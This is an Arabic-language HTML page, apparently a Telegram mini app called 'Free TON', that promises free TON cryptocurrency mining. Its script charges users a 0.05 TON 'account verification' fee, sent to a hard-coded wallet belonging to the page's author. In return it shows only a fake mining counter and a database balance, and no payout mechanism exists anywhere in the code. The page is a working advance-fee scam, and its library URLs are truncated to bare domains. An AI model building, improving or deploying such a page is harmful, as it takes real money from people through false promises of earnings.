<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>تون مجاني - Ton Majani</title>
  <script src="https://telegram.org"></script>
  <script src="https://unpkg.com"></script>
  <script src="https://jsdelivr.net"></script>
  <script src="https://tailwindcss.com"></script>
  <style>
    body { background-color: #0f172a; color: #f8fafc; font-family: system-ui, -apple-system, sans-serif; user-select: none; }
    .glow { box-shadow: 0 0 25px rgba(56, 189, 248, 0.35); }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4 pb-8">

  <!-- الرأس وزر المحفظة -->
  <div class="w-full max-w-md flex justify-between items-center bg-slate-800/80 p-3 rounded-2xl border border-slate-700">
    <div>
      <h1 class="font-bold text-lg text-sky-400">تون مجاني 💎</h1>
      <p id="user-name" class="text-xs text-slate-400">جاري التحميل...</p>
    </div>
    <div id="ton-connect"></div>
  </div>

  <!-- بطاقة الرصيد والتعدين -->
  <div class="w-full max-w-md bg-gradient-to-b from-slate-800 to-slate-900 rounded-3xl p-6 border border-slate-700 text-center glow my-4">
    <span id="status-badge" class="px-3 py-1 rounded-full text-xs font-semibold bg-amber-500/20 text-amber-400 border border-amber-500/30">
      غير موثق ⚠️
    </span>
    
    <div class="mt-5">
      <p class="text-slate-400 text-sm">رصيدك الحالي</p>
      <div class="text-4xl font-extrabold text-white mt-1 tracking-tight">
        <span id="balance-display">0.000000</span> <span class="text-sky-400 text-xl">TON</span>
      </div>
    </div>

    <!-- شاشة التعدين المباشر -->
    <div class="mt-6 bg-slate-950/60 p-4 rounded-2xl border border-slate-800">
      <div class="flex justify-between text-xs text-slate-400 mb-1">
        <span>سرعة التعدين: <strong class="text-emerald-400">0.5 / يومياً</strong></span>
        <span id="mining-state" class="text-amber-400">متوقف</span>
      </div>
      <div class="text-2xl font-mono font-bold text-sky-300 my-2" id="unclaimed-display">0.000000</div>
      <p class="text-[11px] text-slate-500">الأرباح غير المُطالب بها</p>
    </div>

    <!-- أزرار التحكم (توثيق أو مطالبة) -->
    <div class="mt-6">
      <button id="verify-btn" onclick="verifyAccount()" class="w-full py-3.5 px-4 bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-bold rounded-xl shadow-lg transition active:scale-95">
        توثيق الحساب وتفعيل التعدين (0.05 TON)
      </button>

      <button id="claim-btn" onclick="claimProfit()" class="hidden w-full py-3.5 px-4 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-white font-bold rounded-xl shadow-lg transition active:scale-95">
        المطالبة بالأرباح الآن (Claim) 💰
      </button>
    </div>
  </div>

  <!-- تذييل توضيحي -->
  <p class="text-center text-xs text-slate-500 max-w-xs">
    يُطلب توثيق الحساب لمرة واحدة بقيمة 0.05 TON لمكافحة الحسابات الوهمية وتفعيل التعدين السحابي الدائم.
  </p>

  <script>
    // 1. إعدادات قاعدة البيانات ومحفظتك
    const SUPABASE_URL = 'https://supabase.co';
    const SUPABASE_KEY = 'sb_publishable_LeqAYFFbNWS7oKgtlmWaUg_2xkbtBpl';
    const MY_WALLET = 'UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO';
    
    const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
    const tg = window.Telegram.WebApp;
    tg.expand();

    // بيانات المستخدم من تيليجرام (أو رقم تجريبي إذا فُتح من المتصفح)
    const tgUser = tg.initDataUnsafe?.user || { id: 123456789, username: 'مستخدم_تجريبي' };
    document.getElementById('user-name').innerText = '@' + (tgUser.username || tgUser.first_name || tgUser.id);

    let userData = null;
    let connectedWallet = null;

    // 2. تهيئة ربط محفظة TON
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: window.location.origin + '/tonconnect-manifest.json',
      buttonRootId: 'ton-connect'
    });

    tonConnectUI.onStatusChange(async (wallet) => {
      if (wallet) {
        connectedWallet = wallet.account.address;
        if (userData && !userData.wallet_address) {
          await db.from('users').update({ wallet_address: connectedWallet }).eq('telegram_id', tgUser.id);
        }
      } else {
        connectedWallet = null;
      }
    });

    // 3. جلب أو إنشاء بيانات المستخدم في Supabase
    async function loadUser() {
      let { data, error } = await db.from('users').select('*').eq('telegram_id', tgUser.id).single();
      
      if (!data) {
        const newUser = {
          telegram_id: tgUser.id,
          username: tgUser.username || 'User',
          is_verified: false,
          balance: 0,
          mining_speed: 0.5,
          last_claim: new Date().toISOString()
        };
        const res = await db.from('users').insert([newUser]).select().single();
        data = res.data;
      }
      userData = data;
      updateUI();
    }

    // 4. تحديث الشاشة وعداد التعدين الحي
    function updateUI() {
      if (!userData) return;
      document.getElementById('balance-display').innerText = Number(userData.balance).toFixed(6);

      if (userData.is_verified) {
        document.getElementById('status-badge').innerText = 'موثق ونشط ✅';
        document.getElementById('status-badge').className = 'px-3 py-1 rounded-full text-xs font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
        document.getElementById('mining-state').innerText = 'يعمل الآن ⚡';
        document.getElementById('mining-state').className = 'text-emerald-400 font-bold';
        document.getElementById('verify-btn').classList.add('hidden');
        document.getElementById('claim-btn').classList.remove('hidden');
      }
    }

    // تحديث العداد كل ثانية
    setInterval(() => {
      if (userData && userData.is_verified) {
        const lastClaim = new Date(userData.last_claim).getTime();
        const now = Date.now();
        const secondsPassed = Math.max(0, (now - lastClaim) / 1000);
        const speedPerSecond = Number(userData.mining_speed) / 86400; // 0.5 في اليوم
        const mined = secondsPassed * speedPerSecond;
        document.getElementById('unclaimed-display').innerText = mined.toFixed(6);
      }
    }, 1000);

    // 5. دالة التوثيق ودفع 0.05 TON
    async function verifyAccount() {
      if (!connectedWallet) {
        alert('يرجى ربط محفظة TON أولاً من الزر في الأعلى!');
        tonConnectUI.openModal();
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
          {
            address: MY_WALLET,
            amount: "50000000" // 0.05 TON
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        if (result) {
          const nowIso = new Date().toISOString();
          await db.from('users').update({ 
            is_verified: true, 
            wallet_address: connectedWallet,
            last_claim: nowIso 
          }).eq('telegram_id', tgUser.id);
          
          userData.is_verified = true;
          userData.last_claim = nowIso;
          updateUI();
          alert('تم توثيق حسابك بنجاح وبدأ التعدين! 🎉');
        }
      } catch (e) {
        alert('تم إلغاء عملية الدفع أو حدث خطأ.');
      }
    }

    // 6. دالة المطالبة بالأرباح
    async function claimProfit() {
      const unclaimed = parseFloat(document.getElementById('unclaimed-display').innerText);
      if (unclaimed <= 0.000001) {
        alert('انتظر قليلاً لتجميع أرباح كافية للمطالبة!');
        return;
      }

      const newBalance = Number(userData.balance) + unclaimed;
      const nowIso = new Date().toISOString();

      await db.from('users').update({
        balance: newBalance,
        last_claim: nowIso
      }).eq('telegram_id', tgUser.id);

      userData.balance = newBalance;
      userData.last_claim = nowIso;
      document.getElementById('unclaimed-display').innerText = '0.000000';
      updateUI();
      alert('تمت إضافة ' + unclaimed.toFixed(6) + ' TON إلى رصيدك! 💰');
    }

    loadUser();
  </script>
</body>
</html>
